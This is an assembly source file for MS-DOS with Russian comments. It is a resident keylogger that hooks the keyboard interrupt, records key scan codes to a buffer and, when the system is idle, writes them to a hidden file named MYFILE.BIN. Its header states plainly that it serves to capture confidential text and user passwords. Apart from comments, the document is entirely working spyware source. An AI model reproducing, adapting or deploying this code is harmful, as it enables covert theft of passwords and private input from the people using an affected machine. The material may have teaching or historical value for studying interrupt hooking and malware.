;====Программа сохраняет скен-коды нажатых и отжатых клавиш
;====в файле MYFILE.BIN, перехватывая прерывание 09h.
;====Может использоваться для получения информации о вводимых
;====конфиденциальных текстах, паролях пользователей и т. п.
.MODEL tiny
.CODE
ORG 100h

Begin:  jmp     Install

;==== Данные резидентной секции =========================
Old09h      DD  ?               ; Ячейка для хранения "старого" ВП 09h
Old28h      DD  ?               ; Ячейка для хранения "старого" ВП 28h
EnWrFile    DB  0               ; Флаг разрешения записи в файл
EnWrBuf     DB  1               ; Флаг разрешения записи в буфер
FName       DB  'myfile.bin',0  ; Имя файла в формате ASCIIZ
Max         =   50              ; Число нажатий и отжатий клавиш
Count       DW  0               ; Счетчик операций записи в буфер
Buf         DB  100h DUP (?)    ; Буфер для записи
                                ; скен-кодов нажатых клавиш

;===== Наш обработчик прерывания 09h =====================
New09h:  push    ds
         push    cs
         pop     ds
; Проверим флаг EnWrBuf, если EnWrBuf = 1, запись в буфер Buf,
; в противном случае - переход на "старый" обработчик 09h
         cmp     EnWrBuf, 0
         jz      OutOfHandler09h
         push    ax bx
         in      al, 60h             ; Считывание скен-кода клавиши
         mov     bx, Count           ; Считывание значения Count
         mov     Buf[bx], al         ; Запись скен-кода в буфер Buf
         inc     Count               ; Увеличение содержимого Count на 1
         cmp     bx, Max             ; Сравнение значения Count с Max
         jnz     BufNotFull
         mov     EnWrBuf, 0          ; Буфер полон
         mov     EnWrFile, 1         ; Разрешение записи в файл

BufNotFull:
         pop     bx ax

OutOfHandler09h:
         pop     ds
         jmp     DWORD PTR cs:Old09h ; переход на "старый" обработчик 09h

;===== Наш обработчик прерывания 28h =====================
New28h:  push    ds
         push    cs
         pop     ds
; Переход на "старый" обработчик 28h
         pushf
         call    DWORD PTR Old28h

; Если EnWrFile = 0, на выход из обработчика, в противном
; случае - запись содержимого буфера Buf в файл myfile.bin
         cmp     EnWrFile, 0
         jz      OutOfHandler28h

; Запись содержимого буфера Buf в файл myfile.bin
         push    ax bx cx dx
         mov     ah, 3Ch
         mov     cx, 2              ; Атрибут файла
         mov     dx, OFFSET FName   ; Указатель на имя файла
         int     21h                ; Открытие файла
         jc      EndWr
         mov     bx, ax             ; дескриптор файла в BX
         mov     ah, 40h
         mov     cx, 100h
         mov     dx, OFFSET Buf
         int     21h                ; Запись в файл
         mov     ah, 3Eh
         int     21h                ; Закрытие файла
EndWr:
         mov     EnWrFile, 0
         pop     dx cx bx ax

OutOfHandler28h:
         pop     ds
         iret

ResSize = $ - Begin

;===== Установочная секция программы =====================
Install:
        ; Чтение "старого" ВП 09h и запись его в ячейку Old09h.
        ; Запись в таблицу векторов прерываний "нового" ВП 09h
        mov     ax, 3509h
        int     21h
        mov     WORD PTR Old09h, bx
        mov     WORD PTR Old09h+2, es
        mov     ax, 2509h
        mov     dx, OFFSET New09h
        int     21h

        ; Чтение "старого" ВП 28h, запись его в ячейку Old28h,
        ; запись в таблицу векторов прерываний "нового" ВП 28h
        mov     ax, 3528h
        int     21h
        mov     WORD PTR Old28h, bx
        mov     WORD PTR Old28h+2, es
        mov     ax, 2528h
        mov     dx, OFFSET New28h
        int     21h

        ; Завершение программы и оставление ее резидентной
        mov     ax, 3100h
        mov     dx, (ResSize+10fh)/16
        int     21h

        END Begin
